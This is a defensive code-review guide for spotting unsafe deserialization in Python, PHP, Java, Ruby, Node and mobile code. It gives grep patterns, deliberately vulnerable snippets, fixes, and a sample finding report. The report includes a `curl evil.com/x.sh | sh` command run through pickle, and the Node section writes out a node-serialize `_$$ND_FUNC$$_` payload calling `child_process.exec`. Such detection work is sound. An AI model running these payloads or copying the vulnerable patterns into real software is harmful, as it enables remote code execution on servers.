# Check — Unsafe deserialization (untrusted input → live objects)

**What you're looking for:** any place where bytes that came from the *outside world* — a request body, a query string, a cookie, an upload, a header — get fed to a deserializer that rebuilds them into live program objects. The dangerous deserializers don't just read data; they can be tricked into *constructing* objects, calling methods, and running code while they "load" the input. So when attacker-controlled bytes go in, attacker-chosen code can come out. This is the bug class behind some of the biggest breaches on record (Equifax-adjacent Java gadget chains, countless PHP object-injection takeovers), and AI code generators reproduce it because `pickle.loads(data)` or `unserialize($_COOKIE['x'])` reads as a one-liner that "just works."

The key distinction, and the whole reason this check has a false-positive guard:

- **Data formats** — JSON, `yaml.safe_load`, protobuf — only ever give you back plain data (strings, numbers, lists, maps). Safe by design.
- **Object formats** — Python `pickle`, PHP `unserialize`, Java `ObjectInputStream`, Ruby `Marshal` — reconstruct *arbitrary typed objects*, which is what makes them a remote-code-execution primitive when the input is hostile.

You only have a finding when **(a)** an object-format deserializer is used **and (b)** the bytes trace back to something a stranger can control.

## How to scan

You're reading the repo, not running it. Grep for the dangerous deserializers per language, then trace each hit one step back to its input source.

### Python — pickle / cPickle / yaml.load / jsonpickle

```bash
grep -rEn --include='*.py' \
  -E '\b(pickle|cPickle|_pickle)\.(loads?|Unpickler)\b|jsonpickle\.decode|yaml\.load\b' \
  . 2>/dev/null
```

The smell: `pickle.loads(...)`, `pickle.load(...)`, `cPickle.loads(...)`, `jsonpickle.decode(...)`, or `yaml.load(...)` **without** an explicit `Loader=SafeLoader` / `Loader=yaml.SafeLoader`. Bare `yaml.load(data)` on old PyYAML (< 5.1) defaulted to the full loader that instantiates arbitrary Python objects via `!!python/object`.

### PHP — unserialize on superglobals

```bash
grep -rEn --include='*.php' \
  -E 'unserialize\s*\(' \
  . 2>/dev/null

# Tighten to the request-sourced ones
grep -rEn --include='*.php' \
  -E 'unserialize\s*\(\s*\$_(GET|POST|REQUEST|COOKIE|FILES)|unserialize\s*\(\s*(file_get_contents|base64_decode)' \
  . 2>/dev/null
```

The smell: `unserialize($_GET[...])`, `unserialize($_POST[...])`, `unserialize($_COOKIE[...])`, or `unserialize(base64_decode($input))` where `$input` is request-sourced. PHP object injection lets an attacker craft a serialized object that fires your classes' `__wakeup`/`__destruct` magic methods (a "POP gadget chain") to reach file writes or code execution.

### Java / Kotlin — ObjectInputStream / XMLDecoder / XStream / SnakeYAML

```bash
grep -rEn --include='*.java' --include='*.kt' \
  -E 'ObjectInputStream|\.readObject\s*\(|\.readUnshared\s*\(|XMLDecoder|XStream\b|new\s+Yaml\s*\(\s*\)|SerializationUtils\.deserialize' \
  . 2>/dev/null
```

The smell: a `new ObjectInputStream(...)` wrapping a request stream followed by `.readObject()`; `XMLDecoder(...).readObject()`; `new XStream().fromXML(userXml)`; Apache Commons `SerializationUtils.deserialize(bytes)`; or SnakeYAML's `new Yaml().load(userString)` (the no-arg constructor allows arbitrary types — the safe form passes a `SafeConstructor`). These are the classic Java gadget-chain sinks.

### Ruby — Marshal / YAML.load / Oj object mode

```bash
grep -rEn --include='*.rb' \
  -E 'Marshal\.load|Marshal\.restore|YAML\.load\b|YAML\.unsafe_load|Oj\.load|Oj\.object_load' \
  . 2>/dev/null
```

The smell: `Marshal.load(...)` / `Marshal.restore(...)` on anything external; `YAML.load(...)` on Psych < 4 / Ruby < 3.1 (which deserialized arbitrary objects — fixed so `YAML.load` is now safe-by-default, but `YAML.unsafe_load` brings the danger back); or `Oj.load(...)` / `Oj.object_load(...)` when Oj's mode is `:object` (the mode that materializes Ruby objects from `^o` tags).

### Node.js — node-serialize / funcster / serialize-to-js / eval-based "JSON"

```bash
grep -rEn --include='*.ts' --include='*.js' --include='*.mjs' --include='*.cjs' \
  --exclude-dir={node_modules,.next,dist,build} \
  -E 'node-serialize|serialize\.unserialize|require\(.serialize-javascript.\)|funcster|serialize-to-js|cryo|\beval\(\s*JSON' \
  . 2>/dev/null
```

The smell: `require("node-serialize").unserialize(req.body)` — its serialized format permits an `_$$ND_FUNC$$_` payload that is immediately invoked, so untrusted input is direct RCE. Also `funcster.deepDeserialize(...)`, `serialize-to-js`/`cryo` round-tripping untrusted strings, or any home-rolled `eval("(" + JSON_ish_string + ")")` "deserializer." (`serialize-javascript` is for *output*; the risk is if someone `eval`s its result back in from an untrusted source.)

### Mobile — Swift / Kotlin-Android / Flutter / React-Native

```bash
# iOS / Swift — NSKeyedUnarchiver without secure coding, classic NSUnarchiver
grep -rEn --include='*.swift' \
  -E 'NSKeyedUnarchiver\.unarchiveObject|unarchiveTopLevelObjectWithData|NSUnarchiver|requiresSecureCoding\s*=\s*false' \
  . 2>/dev/null

# Android — Java/Kotlin object streams + parceling foreign bytes
grep -rEn --include='*.kt' --include='*.java' \
  -E 'ObjectInputStream|\.readObject\s*\(|readSerializable\(|unmarshall\s*\(' \
  . 2>/dev/null

# Flutter / Dart — note: dart:convert jsonDecode is SAFE; flag only object revivers fed remote bytes
grep -rEn --include='*.dart' \
  -E 'SpawnIsolate|deserialize\(' \
  . 2>/dev/null

# React Native — same Node sinks, plus eval-on-bridge-message
grep -rEn --include='*.ts' --include='*.tsx' --include='*.js' --include='*.jsx' \
  -E 'node-serialize|\beval\(' \
  . 2>/dev/null
```

On iOS the danger is `NSKeyedUnarchiver.unarchiveObject(with:)` (the non-secure API) or `NSKeyedUnarchiver` with `requiresSecureCoding = false` on data pulled from the network, a push payload, or a custom URL scheme. The secure path is `unarchivedObject(ofClass:from:)` with an explicit expected class. On Android it's the same `ObjectInputStream.readObject()` / `Intent.getSerializableExtra()` story — a malicious app or a tampered file can hand you hostile serialized bytes.

### After any hit — trace one step back

This is the make-or-break step. For each match, ask: **does the value being deserialized come from outside the app?**

Request-sourced (real finding) includes:
`req.body` / `req.query` / `req.params` / `req.cookies` / `req.headers` (Express/Node), `request.data` / `request.POST` / `request.GET` / `request.body` / `self.request` (Django/DRF/Flask), `$_GET` / `$_POST` / `$_REQUEST` / `$_COOKIE` / `$_FILES` / `php://input` (PHP), `params[...]` / `cookies[...]` / `request.body.read` (Rails), `request.getParameter` / `getInputStream` / `getReader` / `Cookie` (Java servlets), an uploaded file, a message-queue payload, a webview/bridge message, a push-notification payload, a custom URL scheme, or a third-party API response you don't control.

If the bytes are something **your own app just serialized and is reading back** — your own cache entry, your own signed session you wrote with a server-side key, a file you generated this process — and an attacker can't substitute them, it's a trusted round-trip and **not** a finding. (See "Don't false-positive on" for the nuance: a cache or cookie an attacker *can* tamper with is back to being untrusted.)

## The dangerous patterns

**Pattern 1: Python `pickle.loads` on a request body (RCE)**

```python
# ❌ "Restore session" / "load saved state" endpoint
import pickle, base64
@app.post("/restore")
def restore():
    blob = base64.b64decode(request.data)   # attacker controls request.data
    state = pickle.loads(blob)               # ← runs attacker code while "loading"
    return {"ok": True}
```

`pickle` can encode an object whose unpickling triggers `__reduce__`, which can be set to `os.system("…")`. An attacker sends a crafted blob and your server runs their command — read `.env`, dump the DB, pivot to your cloud. **CRITICAL, always**, when the input is user-controlled.

**Pattern 2: PHP `unserialize` on a cookie (object injection)**

```php
// ❌ "Remember my preferences" cookie
$prefs = unserialize($_COOKIE['prefs']);   // ← attacker controls the cookie value
```

An attacker sets the `prefs` cookie to a serialized object of one of *your* classes. When PHP rebuilds it and later destroys it, your class's `__wakeup`/`__destruct` fires with attacker-chosen properties — a POP gadget chain that can reach file writes, SQL, or code execution. **CRITICAL.**

**Pattern 3: Java `ObjectInputStream.readObject()` on a request stream (gadget chain)**

```java
// ❌ Reading a serialized Java object straight off the wire
ObjectInputStream in = new ObjectInputStream(request.getInputStream());
Object payload = in.readObject();   // ← deserializes whatever the client sent
```

If any vulnerable library (older Commons-Collections, etc.) is on the classpath, an attacker ships a serialized "gadget chain" that executes commands during `readObject()`. This is the canonical Java RCE that hit thousands of enterprise apps. **CRITICAL.**

**Pattern 4: Ruby `Marshal.load` / `YAML.load` on params**

```ruby
# ❌ Loading a marshalled blob from a parameter
data = Marshal.load(Base64.decode64(params[:state]))   # ← attacker controls params[:state]
```

`Marshal.load` reconstructs arbitrary Ruby objects and is a well-known RCE primitive on untrusted input; pre-3.1 `YAML.load` was the same. **CRITICAL.**

**Pattern 5: Node `node-serialize.unserialize` on a body (direct RCE)**

```js
// ❌ Using node-serialize on untrusted input
const serialize = require("node-serialize");
app.post("/load", (req, res) => {
  const obj = serialize.unserialize(req.body.token);   // ← immediate code execution
  res.json(obj);
});
```

`node-serialize`'s format supports an `_$$ND_FUNC$$_` field holding a function body that it invokes on deserialize. A request body of `{"x":"_$$ND_FUNC$$_function(){require('child_process').exec('…')}()"}` runs on your server. **CRITICAL.**

## The fixes — show these, with code

The one rule that fixes every case: **never turn attacker bytes into live objects. Use a data-only format, or restrict which classes are allowed.**

**Python — use JSON; if you must use YAML, use `safe_load`.**

```python
# ✅ Data in, data out — json gives you plain dicts/lists, never code
import json
state = json.loads(request.data)        # safe; raises on malformed input

# ✅ YAML must use the safe loader
import yaml
cfg = yaml.safe_load(request.data)       # or yaml.load(data, Loader=yaml.SafeLoader)
```

If you genuinely need to persist Python objects, serialize to JSON with explicit fields, or sign your pickle with an HMAC you verify *before* unpickling — but for anything a user touches, JSON is the answer.

**PHP — JSON, or `unserialize` with an `allowed_classes` allowlist.**

```php
// ✅ Use JSON for client-supplied structured data
$prefs = json_decode($_COOKIE['prefs'], true);   // associative array, no objects

// ✅ If you must use unserialize, forbid object instantiation
$prefs = unserialize($input, ['allowed_classes' => false]);  // PHP 7+; rejects objects
```

**Java — avoid native serialization for untrusted data; use JSON (Jackson/Gson). If unavoidable, install a deserialization allowlist filter.**

```java
// ✅ Prefer a data format
MyDto dto = new ObjectMapper().readValue(request.getInputStream(), MyDto.class);

// ✅ If you truly must use ObjectInputStream, restrict accepted classes (Java 9+)
ObjectInputStream in = new ObjectInputStream(request.getInputStream());
in.setObjectInputFilter(ObjectInputFilter.Config.createFilter(
    "com.yourapp.dto.*;!*"));   // allow your DTOs, reject everything else
Object payload = in.readObject();
```

For SnakeYAML use `new Yaml(new SafeConstructor(new LoaderOptions()))`; for XStream configure `addPermission`/`allowTypes` and never the default open mode; avoid `XMLDecoder` on untrusted XML entirely.

**Ruby — JSON, or `YAML.safe_load` with an explicit permitted-classes list.**

```ruby
# ✅ JSON for untrusted structured input
data = JSON.parse(params[:state])

# ✅ If YAML is required, restrict permitted classes (never plain load/unsafe_load on untrusted)
data = YAML.safe_load(params[:state], permitted_classes: [Symbol, Date])
```

For Oj, deserialize untrusted input in a strict/data mode (`Oj.load(str, mode: :strict)`), never `:object`.

**Node — use `JSON.parse`. Delete `node-serialize`/`funcster` from any untrusted path.**

```js
// ✅ JSON.parse only ever returns plain data — no functions, no code
const obj = JSON.parse(req.body.token);   // wrap in try/catch for malformed input
```

There is essentially no legitimate reason to deserialize *functions* from a client. If you were using `node-serialize` to ship behavior, redesign so the server already has the code and the client only sends data (an action name + JSON args).

**Mobile — secure coding with an expected class.**

```swift
// ✅ iOS — require secure coding and name the class you expect
let obj = try NSKeyedUnarchiver.unarchivedObject(ofClass: MyModel.self, from: data)
```

On Android, prefer JSON (Moshi/Gson/`kotlinx.serialization`) for any data crossing a trust boundary; never `ObjectInputStream.readObject()` or `Intent.getSerializableExtra()` on bytes from another app, a file, or the network without a class filter.

## Report a finding as

**Title:** "Your `/restore` endpoint runs whatever code a visitor sends"

(that's the pickle/Node RCE headline — adapt to the flavor: PHP → "A tampered cookie can run code on your server"; Java → "A serialized object on the wire can take over the server"; Ruby → "A request parameter can execute code via `Marshal.load`")

**Detail:**
> `app/api/restore.py:14` takes the raw request body and feeds it to `pickle.loads()`:
> ```python
> blob = base64.b64decode(request.data)
> state = pickle.loads(blob)
> ```
> `request.data` is whatever the caller sends. `pickle` doesn't just read data — it *rebuilds Python objects*, and a crafted object can run a command (via `__reduce__`) the moment it's unpickled. So this isn't "load some saved state," it's "run code the visitor chose."
>
> **What can go wrong:** An attacker sends a small base64 blob built with `pickle` that, on load, runs `os.system("curl evil.com/x.sh | sh")` — on your server, as your app. From there they read your `.env`, dump your database, and pivot into your cloud account. No login required; the endpoint is the exploit. Automated scanners probe for exactly this on public Python apps.
>
> **How to fix tonight (10 minutes):**
> 1. Switch to a data-only format. If the saved state is just fields, use JSON:
>    ```python
>    import json
>    state = json.loads(request.data)   # returns a plain dict — can never run code
>    ```
> 2. If you control both ends and truly need YAML, use the safe loader, never bare `load`:
>    ```python
>    import yaml
>    cfg = yaml.safe_load(request.data)
>    ```
> 3. Grep the rest of the repo for the same shape — `pickle.loads`, `yaml.load(` without `SafeLoader`, `jsonpickle.decode`. Where there's one untrusted deserialize there are often more. Fix them all in one pass.
> 4. Verify: send a malformed body after deploy. A fixed app returns a clean 400 ("invalid JSON"); a vulnerable one was happily reconstructing objects.

Repeat the report block for every distinct untrusted-deserialization site you found, grouped by language/sink.

## Don't false-positive on

This check is high-severity, so a wrong flag is costly — be strict. Only flag when an **object-format deserializer** meets **attacker-controllable bytes.**

- **`JSON.parse` / `json.loads` / `json_decode` / `JSON.parse` (Ruby) / `jsonDecode` (Dart).** JSON deserialization only ever produces plain data — strings, numbers, arrays, maps. It cannot construct typed objects or run code. **Safe. Never flag**, no matter where the input comes from. (The only JSON-adjacent risk is someone `eval`-ing a JSON-ish string by hand — that's the injection check, and it's caught by the `eval(JSON` pattern above.)
- **`yaml.safe_load` / `yaml.load(..., Loader=SafeLoader)` / `YAML.safe_load` / SnakeYAML with `SafeConstructor`.** The whole point of the safe loader is that it refuses to instantiate arbitrary types. Safe. Likewise modern Ruby `YAML.load` (Psych ≥ 4 / Ruby ≥ 3.1) is safe-by-default — only `YAML.unsafe_load` reintroduces the risk.
- **Trusted round-trips of your own data.** Code that pickles/marshals a value and reads *the same bytes* back within a context an attacker can't reach — an in-memory cache you populated this process, a file your build wrote, a server-to-server channel with no user input — is not exploitable. **But** the moment those bytes live somewhere a user can edit (a cookie, a request param, `localStorage`, an unsigned cache key they influence, an upload), it's untrusted again — flag it.
- **Signed/verified payloads, verified *before* deserializing.** If the code checks an HMAC/signature it computed with a server-only key and *rejects* a bad signature *before* calling the deserializer, the bytes are authenticated and not attacker-controllable. (Order matters: verify, then deserialize. Deserializing first and checking after is still vulnerable.)
- **`serialize-javascript` used only for output.** Generating a string to embed in an HTML page is its job and is fine; the risk only appears if someone reads an untrusted such string back via `eval`. Don't flag the serialize side.
- **Deserializers fed hardcoded constants or developer-authored fixtures.** A test that `pickle.loads` a literal it just dumped, a seed script loading a checked-in fixture, a config the developer wrote — no user source, no finding. Paths under `__tests__/`, `*.test.*`, `*.spec.*`, `fixtures/`, `seeds/`, `spec/` are not a production attack surface unless real prod input flows through them.
- **`Marshal`/`pickle` used by a framework internally** (Rails cache stores, Celery result backends, session stores) where the transport is server-side and not user-substitutable. Only flag if the user can supply or tamper with the serialized bytes that reach `load`.

When in doubt, trace the value to its source. **Object-format deserializer + a source a stranger controls = finding. Anything else = not.** The product's credibility depends on not flagging every `pickle.loads()` in the codebase.
